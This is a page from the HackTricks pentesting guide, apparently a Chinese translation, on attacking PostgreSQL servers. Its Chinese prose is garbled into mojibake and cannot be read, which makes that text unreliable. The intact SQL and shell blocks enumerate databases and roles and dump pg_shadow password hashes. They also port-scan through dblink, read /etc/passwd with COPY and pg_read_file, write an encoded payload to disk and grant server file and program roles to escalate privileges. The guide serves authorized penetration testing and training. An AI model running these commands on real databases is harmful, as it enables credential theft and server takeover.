<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>5432,5433 - Pentesting Postgresql</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="54325433---pentesting-postgresql"><a class="header" href="#54325433---pentesting-postgresql">5432,5433 - Pentesting Postgresql</a></h1>
<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
ä½¿ç”¨ <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_content=pentesting-postgresql"><strong>Trickest</strong></a> è½»æ¾æ„å»ºå’Œ <strong>è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹</strong>ï¼Œç”±ä¸–ç•Œä¸Š <strong>æœ€å…ˆè¿›</strong> çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚<br />
ç«‹å³è·å–è®¿é—®æƒé™ï¼š</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=pentesting-postgresql" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<h2 id="åŸºæœ¬ä¿¡æ¯"><a class="header" href="#åŸºæœ¬ä¿¡æ¯"><strong>åŸºæœ¬ä¿¡æ¯</strong></a></h2>
<p><strong>PostgreSQL</strong> è¢«æè¿°ä¸ºä¸€ä¸ª <strong>å¯¹è±¡å…³ç³»æ•°æ®åº“ç³»ç»Ÿ</strong>ï¼Œå®ƒæ˜¯ <strong>å¼€æº</strong> çš„ã€‚è¯¥ç³»ç»Ÿä¸ä»…ä½¿ç”¨ SQL è¯­è¨€ï¼Œè¿˜é€šè¿‡é¢å¤–çš„åŠŸèƒ½å¢å¼ºäº†å®ƒã€‚å®ƒçš„èƒ½åŠ›ä½¿å…¶èƒ½å¤Ÿå¤„ç†å„ç§æ•°æ®ç±»å‹å’Œæ“ä½œï¼Œæˆä¸ºå¼€å‘äººå‘˜å’Œç»„ç»‡çš„å¤šåŠŸèƒ½é€‰æ‹©ã€‚</p>
<p><strong>é»˜è®¤ç«¯å£ï¼š</strong> 5432ï¼Œå¦‚æœæ­¤ç«¯å£å·²è¢«ä½¿ç”¨ï¼Œä¼¼ä¹ postgresql å°†ä½¿ç”¨ä¸‹ä¸€ä¸ªæœªä½¿ç”¨çš„ç«¯å£ï¼ˆå¯èƒ½æ˜¯ 5433ï¼‰ã€‚</p>
<pre><code>PORT     STATE SERVICE
5432/tcp open  pgsql
</code></pre>
<h2 id="è¿æ¥ä¸åŸºæœ¬æšä¸¾"><a class="header" href="#è¿æ¥ä¸åŸºæœ¬æšä¸¾">è¿æ¥ä¸åŸºæœ¬æšä¸¾</a></h2>
<pre><code class="language-bash">psql -U &lt;myuser&gt; # Open psql console with user
psql -h &lt;host&gt; -U &lt;username&gt; -d &lt;database&gt; # Remote connection
psql -h &lt;host&gt; -p &lt;port&gt; -U &lt;username&gt; -W &lt;password&gt; &lt;database&gt; # Remote connection
</code></pre>
<pre><code class="language-sql">psql -h localhost -d &lt;database_name&gt; -U &lt;User&gt; #Password will be prompted
\list # List databases
\c &lt;database&gt; # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
</code></pre>
<p>{% hint style="warning" %}
å¦‚æœè¿è¡Œ <strong><code>\list</code></strong> ä½ å‘ç°ä¸€ä¸ªåä¸º <strong><code>rdsadmin</code></strong> çš„æ•°æ®åº“ï¼Œä½ å°±çŸ¥é“ä½ åœ¨ä¸€ä¸ª <strong>AWS postgresql æ•°æ®åº“</strong> å†…éƒ¨ã€‚
{% endhint %}</p>
<p>æœ‰å…³ <strong>å¦‚ä½•æ»¥ç”¨ PostgreSQL æ•°æ®åº“</strong> çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š</p>
<p>{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
<a href="../pentesting-web/sql-injection/postgresql-injection/">postgresql-injection</a>
{% endcontent-ref %}</p>
<h2 id="è‡ªåŠ¨æšä¸¾"><a class="header" href="#è‡ªåŠ¨æšä¸¾">è‡ªåŠ¨æšä¸¾</a></h2>
<pre><code>msf&gt; use auxiliary/scanner/postgres/postgres_version
msf&gt; use auxiliary/scanner/postgres/postgres_dbname_flag_injection
</code></pre>
<h3 id="æš´åŠ›ç ´è§£"><a class="header" href="#æš´åŠ›ç ´è§£"><a href="../generic-hacking/brute-force.html#postgresql"><strong>æš´åŠ›ç ´è§£</strong></a></a></h3>
<h3 id="ç«¯å£æ‰«æ"><a class="header" href="#ç«¯å£æ‰«æ"><strong>ç«¯å£æ‰«æ</strong></a></h3>
<p>æ ¹æ®<a href="https://www.exploit-db.com/papers/13084"><strong>è¿™é¡¹ç ”ç©¶</strong></a>ï¼Œå½“è¿æ¥å°è¯•å¤±è´¥æ—¶ï¼Œ<code>dblink</code> ä¼šæŠ›å‡ºä¸€ä¸ª <code>sqlclient_unable_to_establish_sqlconnection</code> å¼‚å¸¸ï¼Œå…¶ä¸­åŒ…å«é”™è¯¯çš„è§£é‡Šã€‚ä»¥ä¸‹åˆ—å‡ºäº†è¿™äº›ç»†èŠ‚çš„ç¤ºä¾‹ã€‚</p>
<pre><code class="language-sql">SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
</code></pre>
<ul>
<li>ä¸»æœºå·²å…³é—­</li>
</ul>
<p><code>DETAIL: æ— æ³•è¿æ¥åˆ°æœåŠ¡å™¨ï¼šæ²¡æœ‰åˆ°ä¸»æœºçš„è·¯ç”± æœåŠ¡å™¨æ˜¯å¦åœ¨ä¸»æœº "1.2.3.4" ä¸Šè¿è¡Œå¹¶æ¥å—ç«¯å£ 5678 çš„ TCP/IP è¿æ¥ï¼Ÿ</code></p>
<ul>
<li>ç«¯å£å·²å…³é—­</li>
</ul>
<pre><code>DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
</code></pre>
<ul>
<li>ç«¯å£æ˜¯å¼€æ”¾çš„</li>
</ul>
<pre><code>DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
</code></pre>
<p>æˆ–</p>
<pre><code>DETAIL:  FATAL:  password authentication failed for user "name"
</code></pre>
<ul>
<li>ç«¯å£æ˜¯å¼€æ”¾çš„æˆ–è¢«è¿‡æ»¤çš„</li>
</ul>
<pre><code>DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
</code></pre>
<p>åœ¨ PL/pgSQL å‡½æ•°ä¸­ï¼Œç›®å‰æ— æ³•è·å–å¼‚å¸¸è¯¦ç»†ä¿¡æ¯ã€‚ç„¶è€Œï¼Œå¦‚æœæ‚¨å¯ä»¥ç›´æ¥è®¿é—® PostgreSQL æœåŠ¡å™¨ï¼Œæ‚¨å¯ä»¥æ£€ç´¢æ‰€éœ€çš„ä¿¡æ¯ã€‚å¦‚æœä»ç³»ç»Ÿè¡¨ä¸­æå–ç”¨æˆ·åå’Œå¯†ç ä¸å¯è¡Œï¼Œæ‚¨å¯ä»¥è€ƒè™‘åˆ©ç”¨å‰ä¸€èŠ‚è®¨è®ºçš„å­—å…¸æ”»å‡»æ–¹æ³•ï¼Œå› ä¸ºå®ƒå¯èƒ½ä¼šäº§ç”Ÿç§¯æçš„ç»“æœã€‚</p>
<h2 id="æƒé™æšä¸¾"><a class="header" href="#æƒé™æšä¸¾">æƒé™æšä¸¾</a></h2>
<h3 id="è§’è‰²"><a class="header" href="#è§’è‰²">è§’è‰²</a></h3>
<div class="table-wrapper"><table><thead><tr><th>è§’è‰²ç±»å‹</th><th></th></tr></thead><tbody>
<tr><td>rolsuper</td><td>è§’è‰²å…·æœ‰è¶…çº§ç”¨æˆ·æƒé™</td></tr>
<tr><td>rolinherit</td><td>è§’è‰²è‡ªåŠ¨ç»§æ‰¿å…¶æˆå‘˜è§’è‰²çš„æƒé™</td></tr>
<tr><td>rolcreaterole</td><td>è§’è‰²å¯ä»¥åˆ›å»ºæ›´å¤šè§’è‰²</td></tr>
<tr><td>rolcreatedb</td><td>è§’è‰²å¯ä»¥åˆ›å»ºæ•°æ®åº“</td></tr>
<tr><td>rolcanlogin</td><td>è§’è‰²å¯ä»¥ç™»å½•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªè§’è‰²å¯ä»¥ä½œä¸ºåˆå§‹ä¼šè¯æˆæƒæ ‡è¯†ç¬¦</td></tr>
<tr><td>rolreplication</td><td>è§’è‰²æ˜¯ä¸€ä¸ªå¤åˆ¶è§’è‰²ã€‚å¤åˆ¶è§’è‰²å¯ä»¥å¯åŠ¨å¤åˆ¶è¿æ¥å¹¶åˆ›å»ºå’Œåˆ é™¤å¤åˆ¶æ§½ã€‚</td></tr>
<tr><td>rolconnlimit</td><td>å¯¹äºå¯ä»¥ç™»å½•çš„è§’è‰²ï¼Œè¿™è®¾ç½®äº†è¯¥è§’è‰²å¯ä»¥å»ºç«‹çš„æœ€å¤§å¹¶å‘è¿æ¥æ•°ã€‚-1 è¡¨ç¤ºæ²¡æœ‰é™åˆ¶ã€‚</td></tr>
<tr><td>rolpassword</td><td>ä¸æ˜¯å¯†ç ï¼ˆå§‹ç»ˆæ˜¾ç¤ºä¸º <code>********</code>ï¼‰</td></tr>
<tr><td>rolvaliduntil</td><td>å¯†ç è¿‡æœŸæ—¶é—´ï¼ˆä»…ç”¨äºå¯†ç è®¤è¯ï¼‰ï¼›å¦‚æœæ²¡æœ‰è¿‡æœŸåˆ™ä¸º null</td></tr>
<tr><td>rolbypassrls</td><td>è§’è‰²ç»•è¿‡æ¯ä¸ªè¡Œçº§å®‰å…¨ç­–ç•¥ï¼Œæ›´å¤šä¿¡æ¯è¯·å‚è§ <a href="https://www.postgresql.org/docs/current/ddl-rowsecurity.html">ç¬¬ 5.8 èŠ‚</a>ã€‚</td></tr>
<tr><td>rolconfig</td><td>è§’è‰²ç‰¹å®šçš„è¿è¡Œæ—¶é…ç½®å˜é‡é»˜è®¤å€¼</td></tr>
<tr><td>oid</td><td>è§’è‰²çš„ ID</td></tr>
</tbody></table>
</div>
<h4 id="æœ‰è¶£çš„ç»„"><a class="header" href="#æœ‰è¶£çš„ç»„">æœ‰è¶£çš„ç»„</a></h4>
<ul>
<li>å¦‚æœæ‚¨æ˜¯ <strong><code>pg_execute_server_program</code></strong> çš„æˆå‘˜ï¼Œæ‚¨å¯ä»¥ <strong>æ‰§è¡Œ</strong> ç¨‹åº</li>
<li>å¦‚æœæ‚¨æ˜¯ <strong><code>pg_read_server_files</code></strong> çš„æˆå‘˜ï¼Œæ‚¨å¯ä»¥ <strong>è¯»å–</strong> æ–‡ä»¶</li>
<li>å¦‚æœæ‚¨æ˜¯ <strong><code>pg_write_server_files</code></strong> çš„æˆå‘˜ï¼Œæ‚¨å¯ä»¥ <strong>å†™å…¥</strong> æ–‡ä»¶</li>
</ul>
<p>{% hint style="info" %}
è¯·æ³¨æ„ï¼Œåœ¨ Postgres ä¸­ï¼Œ<strong>ç”¨æˆ·</strong>ã€<strong>ç»„</strong>å’Œ<strong>è§’è‰²</strong>æ˜¯ <strong>ç›¸åŒ</strong> çš„ã€‚è¿™ä»…å–å†³äº <strong>æ‚¨å¦‚ä½•ä½¿ç”¨å®ƒ</strong> ä»¥åŠæ‚¨æ˜¯å¦ <strong>å…è®¸å…¶ç™»å½•</strong>ã€‚
{% endhint %}</p>
<pre><code class="language-sql"># Get users roles
\du

#Get users roles &amp; groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
</code></pre>
<h3 id="è¡¨æ ¼"><a class="header" href="#è¡¨æ ¼">è¡¨æ ¼</a></h3>
<pre><code class="language-sql"># Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
</code></pre>
<h3 id="å‡½æ•°"><a class="header" href="#å‡½æ•°">å‡½æ•°</a></h3>
<pre><code class="language-sql"># Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
</code></pre>
<h2 id="æ–‡ä»¶ç³»ç»Ÿæ“ä½œ"><a class="header" href="#æ–‡ä»¶ç³»ç»Ÿæ“ä½œ">æ–‡ä»¶ç³»ç»Ÿæ“ä½œ</a></h2>
<h3 id="è¯»å–ç›®å½•å’Œæ–‡ä»¶"><a class="header" href="#è¯»å–ç›®å½•å’Œæ–‡ä»¶">è¯»å–ç›®å½•å’Œæ–‡ä»¶</a></h3>
<p>æ¥è‡ªè¿™ä¸ª <a href="https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a"><strong>æäº¤</strong> </a> çš„å®šä¹‰ <strong><code>DEFAULT_ROLE_READ_SERVER_FILES</code></strong> ç»„çš„æˆå‘˜ï¼ˆç§°ä¸º <strong><code>pg_read_server_files</code></strong>ï¼‰å’Œ <strong>è¶…çº§ç”¨æˆ·</strong> å¯ä»¥åœ¨ä»»ä½•è·¯å¾„ä¸Šä½¿ç”¨ <strong><code>COPY</code></strong> æ–¹æ³•ï¼ˆæŸ¥çœ‹ <code>convert_and_check_filename</code> åœ¨ <code>genfile.c</code> ä¸­ï¼‰ï¼š</p>
<pre><code class="language-sql"># Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
</code></pre>
<p>{% hint style="warning" %}
è¯·è®°ä½ï¼Œå¦‚æœæ‚¨ä¸æ˜¯è¶…çº§ç”¨æˆ·ä½†æ‹¥æœ‰ <strong>CREATEROLE</strong> æƒé™ï¼Œæ‚¨å¯ä»¥ <strong>ä½¿è‡ªå·±æˆä¸ºè¯¥ç»„çš„æˆå‘˜ï¼š</strong></p>
<pre><code class="language-sql">GRANT pg_read_server_files TO username;
</code></pre>
<p><a href="pentesting-postgresql.html#privilege-escalation-with-createrole"><strong>æ›´å¤šä¿¡æ¯ã€‚</strong></a>
{% endhint %}</p>
<p>æœ‰ <strong>å…¶ä»– postgres å‡½æ•°</strong> å¯ä»¥ç”¨æ¥ <strong>è¯»å–æ–‡ä»¶æˆ–åˆ—å‡ºç›®å½•</strong>ã€‚åªæœ‰ <strong>è¶…çº§ç”¨æˆ·</strong> å’Œ <strong>å…·æœ‰æ˜ç¡®æƒé™çš„ç”¨æˆ·</strong> å¯ä»¥ä½¿ç”¨å®ƒä»¬ï¼š</p>
<pre><code class="language-sql"># Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
</code></pre>
<p>æ‚¨å¯ä»¥åœ¨ <a href="https://www.postgresql.org/docs/current/functions-admin.html">https://www.postgresql.org/docs/current/functions-admin.html</a> æ‰¾åˆ° <strong>æ›´å¤šå‡½æ•°</strong>ã€‚</p>
<h3 id="ç®€å•æ–‡ä»¶å†™å…¥"><a class="header" href="#ç®€å•æ–‡ä»¶å†™å…¥">ç®€å•æ–‡ä»¶å†™å…¥</a></h3>
<p>åªæœ‰ <strong>è¶…çº§ç”¨æˆ·</strong> å’Œ <strong><code>pg_write_server_files</code></strong> çš„æˆå‘˜å¯ä»¥ä½¿ç”¨ copy å†™å…¥æ–‡ä»¶ã€‚</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-sql">copy (select convert_from(decode('&lt;ENCODED_PAYLOAD&gt;','base64'),'utf-8')) to '/just/a/path.exec';
</code></pre>
<p>{% endcode %}</p>
<p>{% hint style="warning" %}
è¯·è®°ä½ï¼Œå¦‚æœæ‚¨ä¸æ˜¯è¶…çº§ç”¨æˆ·ä½†æ‹¥æœ‰ <strong><code>CREATEROLE</code></strong> æƒé™ï¼Œæ‚¨å¯ä»¥ <strong>ä½¿è‡ªå·±æˆä¸ºè¯¥ç»„çš„æˆå‘˜ï¼š</strong></p>
<pre><code class="language-sql">GRANT pg_write_server_files TO username;
</code></pre>
<p><a href="pentesting-postgresql.html#privilege-escalation-with-createrole"><strong>æ›´å¤šä¿¡æ¯ã€‚</strong></a>
{% endhint %}</p>
<p>è¯·è®°ä½ï¼ŒCOPYæ— æ³•å¤„ç†æ¢è¡Œç¬¦ï¼Œå› æ­¤å³ä½¿æ‚¨ä½¿ç”¨çš„æ˜¯base64æœ‰æ•ˆè´Ÿè½½ï¼Œ<strong>æ‚¨éœ€è¦å‘é€ä¸€è¡Œä»£ç </strong>ã€‚<br />
æ­¤æŠ€æœ¯çš„ä¸€ä¸ªéå¸¸é‡è¦çš„é™åˆ¶æ˜¯**<code>copy</code>ä¸èƒ½ç”¨äºå†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› ä¸ºå®ƒä¼šä¿®æ”¹æŸäº›äºŒè¿›åˆ¶å€¼ã€‚**</p>
<h3 id="äºŒè¿›åˆ¶æ–‡ä»¶ä¸Šä¼ "><a class="header" href="#äºŒè¿›åˆ¶æ–‡ä»¶ä¸Šä¼ "><strong>äºŒè¿›åˆ¶æ–‡ä»¶ä¸Šä¼ </strong></a></h3>
<p>ä½†æ˜¯ï¼Œè¿˜æœ‰<strong>å…¶ä»–æŠ€æœ¯å¯ä»¥ä¸Šä¼ å¤§äºŒè¿›åˆ¶æ–‡ä»¶ï¼š</strong></p>
<p>{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
<a href="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.html">big-binary-files-upload-postgresql.md</a>
{% endcontent-ref %}</p>
<h2 id=""><a class="header" href="#"><img src="../.gitbook/assets/i3.png" alt="" data-size="original"></a></h2>
<p><strong>æ¼æ´èµé‡‘æç¤º</strong>ï¼š<strong>æ³¨å†Œ</strong> <strong>Intigriti</strong>ï¼Œè¿™æ˜¯ä¸€ä¸ªç”±é»‘å®¢ä¸ºé»‘å®¢åˆ›å»ºçš„é«˜çº§<strong>æ¼æ´èµé‡‘å¹³å°</strong>ï¼ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬ï¼Œè®¿é—®<a href="https://go.intigriti.com/hacktricks"><strong>https://go.intigriti.com/hacktricks</strong></a>ï¼Œå¼€å§‹èµšå–é«˜è¾¾**$100,000**çš„èµé‡‘ï¼</p>
<p>{% embed url="https://go.intigriti.com/hacktricks" %}</p>
<h3 id="é€šè¿‡æœ¬åœ°æ–‡ä»¶å†™å…¥æ›´æ–°postgresqlè¡¨æ•°æ®"><a class="header" href="#é€šè¿‡æœ¬åœ°æ–‡ä»¶å†™å…¥æ›´æ–°postgresqlè¡¨æ•°æ®">é€šè¿‡æœ¬åœ°æ–‡ä»¶å†™å…¥æ›´æ–°PostgreSQLè¡¨æ•°æ®</a></h3>
<p>å¦‚æœæ‚¨æ‹¥æœ‰è¯»å–å’Œå†™å…¥PostgreSQLæœåŠ¡å™¨æ–‡ä»¶çš„å¿…è¦æƒé™ï¼Œæ‚¨å¯ä»¥é€šè¿‡<strong>è¦†ç›–å…³è”çš„æ–‡ä»¶èŠ‚ç‚¹</strong>æ¥æ›´æ–°æœåŠ¡å™¨ä¸Šçš„ä»»ä½•è¡¨ï¼Œåœ¨<a href="https://www.postgresql.org/docs/8.1/storage.html">PostgreSQLæ•°æ®ç›®å½•</a>ä¸­ã€‚<strong>æœ‰å…³æ­¤æŠ€æœ¯çš„æ›´å¤šä¿¡æ¯</strong> <a href="https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users"><strong>åœ¨è¿™é‡Œ</strong></a>ã€‚</p>
<p>æ‰€éœ€æ­¥éª¤ï¼š</p>
<ol>
<li>è·å–PostgreSQLæ•°æ®ç›®å½•</li>
</ol>
<pre><code class="language-sql">SELECT setting FROM pg_settings WHERE name = 'data_directory';
</code></pre>
